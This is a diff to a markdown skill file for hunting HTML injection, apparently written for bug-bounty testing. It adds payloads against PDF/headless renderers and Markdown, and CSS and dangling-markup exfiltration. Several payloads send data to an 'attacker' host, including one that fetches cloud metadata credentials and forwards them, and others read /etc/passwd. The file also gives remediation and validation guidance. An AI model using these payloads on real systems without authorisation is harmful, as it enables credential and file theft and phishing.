@@ -1,8 +1,11 @@
 ---
 name: hunt-html-injection
 description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
-sources: hackerone_public, public_research
+sources: hackerone_public, public_research, portswigger_research
 report_count: 6
+cwe: [CWE-79, CWE-80, CWE-116, CWE-83]
+cvss_baseline: "Low (3.1-4.3) UI defacement / reflected markup → Medium (5.4-6.1) phishing form / dangling-markup token theft / stored in other users' view → High (7.x+) when it escalates to XSS or server-side (PDF/headless) SSRF/LFI."
+related_skills: [hunt-xss, hunt-ssrf, hunt-lfi, hunt-open-redirect, hunt-dom]
 ---
 
 ## What is HTML Injection
@@ -60,3 +63,80 @@ Confirmed when your injected tag appears in the response body with literal `<` a
 - XSS: `<script>alert(1)</script>` executes JavaScript.
 
 Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.
+
+---
+
+## New Techniques (2024-2026)
+
+### Server-side HTML injection into PDF / headless-Chrome renderers → SSRF / LFI
+The highest-impact version of this class. When your injected HTML is rendered **server-side** into a PDF (invoices, reports, tickets) or a screenshot via `wkhtmltopdf`, Puppeteer/Playwright, or a headless browser, inject tags that make the *server* fetch resources:
+```html
+<iframe src="file:///etc/passwd"></iframe>
+<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+<link rel="attachment" href="file:///etc/passwd">
+<script>fetch('http://169.254.169.254/...').then(r=>r.text()).then(t=>location='http://attacker/?'+t)</script>  <!-- if JS runs in the renderer -->
+```
+If the PDF contents include the file/metadata, you have **server-side SSRF/LFI** from an "HTML injection". Cross-ref `hunt-ssrf`, `hunt-lfi`. This frequently outranks any client-side impact.
+
+### Markdown injection → HTML/XSS
+Apps that render user Markdown to HTML often allow raw HTML passthrough or mishandle links/images:
+```
+[click](javascript:alert(1))
+![x](https://attacker/ssrf)                 <!-- server-side image fetch = SSRF -->
+<img src=x onerror=alert(91234)>            <!-- raw HTML passthrough -->
+[a](<javascript:alert(1)>)   or   [a](java&#115;cript:alert(1))
+```
+Image references in server-rendered Markdown are a common blind-SSRF vector.
+
+### CSS injection — data exfil without JS
+If you can inject `<style>` or style attributes but scripts are blocked, exfiltrate token/secret text via attribute-selector + background-image:
+```html
+<style>input[name=csrf][value^="a"]{background:url(//attacker/a)}</style>  <!-- leak char by char -->
+```
+Also `@import` and font-based exfil. Works under strict CSP that still allows inline styles.
+
+### Dangling-markup exfiltration under CSP
+(Expanded from the impact list.) When `<script>`/handlers are filtered but raw `<` is reflected, an unterminated attribute captures everything up to the next quote/`>`:
+```html
+<img src='//attacker/log?html=
+```
+Everything after — CSRF token, PII, secrets — is sent to the attacker. One of the few reliable CSP bypasses for reflected injection.
+
+### Reverse tabnabbing via injected link
+Injected `<a href="//attacker" target="_blank">` (without `rel=noopener`) lets the attacker page rewrite the opener via `window.opener.location` → phishing redirect of the original tab. Medium-severity standalone.
+
+### Meta-refresh / base-tag hijack
+```html
+<meta http-equiv="refresh" content="0;url=//attacker">   <!-- forced redirect -->
+<base href="//attacker/">                                 <!-- rebase all relative URLs/forms -->
+```
+An injected `<base>` can redirect every relative form POST (including login) to the attacker.
+
+### Encoding / charset bypass
+If `<`/`>` are encoded but the page lacks an explicit charset, try UTF-7 (`+ADw-`), overlong UTF-8, or mutated-XML contexts. Also test where the sink is an attribute (`"`-break) vs element text.
+
+## Tooling
+
+- **Burp** — reflect a unique numeric canary; grep the response for literal `<canary` vs `&lt;canary`.
+- **Headless-render targets** — generate the PDF/screenshot and open it; check whether `file://`/`169.254.169.254` content appears (SSRF/LFI proof).
+- **dalfox / XSS Hunter** — once you confirm raw-HTML passthrough, escalate to `hunt-xss` tooling.
+
+## Remediation
+
+- Context-aware output encoding (HTML-entity-encode `< > " ' &`) at every sink; prefer templating auto-escape.
+- For rich text/Markdown, render through a strict allowlist sanitizer (DOMPurify client-side; server-side sanitizer for stored content) that strips raw HTML, `javascript:` URLs, and event handlers.
+- For server-side PDF/headless rendering, disable `file://`, intranet, and metadata access; run the renderer network-isolated; sanitize the HTML before rendering.
+- Set a strong CSP (no inline, no `data:`), `rel="noopener"` on user links, and an explicit `charset=utf-8`.
+
+## Validation Gate
+
+- **Confirmed** when the injected tag renders with literal `<` (not `&lt;`), or server-side fetch content appears in the PDF/screenshot.
+- State the realized impact: phishing form, dangling-markup token capture (show the exfil request), SSRF/LFI content, or escalation to XSS — "angle brackets reflected" with no demonstrated effect is low/informational.
+- Use a unique 4+ digit canary (`91234`), never `alert(1)`, so you don't claim a practice page's own hint text.
+
+## Disclosed Report Patterns
+
+Verify before quoting IDs/amounts.
+- **HTML/markdown injection into server-side PDF → SSRF/LFI** — recurring high-value class on invoice/report generators.
+- **Stored HTML injection in transactional emails** — e.g. HackerOne #1935628, #3556892-style (injected markup renders in the recipient's inbox).
+- **Dangling-markup CSRF-token theft under CSP** — PortSwigger-documented technique seen in multiple disclosures.
